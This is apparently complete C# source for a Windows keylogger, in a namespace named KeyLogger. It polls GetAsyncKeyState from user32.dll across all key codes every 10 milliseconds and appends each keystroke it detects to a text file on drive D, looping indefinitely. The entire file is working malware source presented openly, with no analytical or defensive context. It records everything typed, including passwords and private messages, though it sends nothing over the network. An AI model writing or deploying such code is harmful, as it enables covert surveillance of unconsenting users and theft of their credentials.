

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            LogKeys();
        }

        static void LogKeys()
        {
            var path = (@"D:\Keylog.text");
            if (!File.Exists(path))
            {
                using (var sw = File.CreateText(path))
                {
                }
            }
           
            var converter = new KeysConverter();

            while (true)
            {
                Thread.Sleep(10);

                for (Int32 i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key != 1 && key != -32767) continue;
                    var text = converter.ConvertToString(i);
                    using (var sw = File.AppendText(path))
                    {
                        sw.WriteLine(text);
                    }
                    break;
                }
            }
        }
    }
}
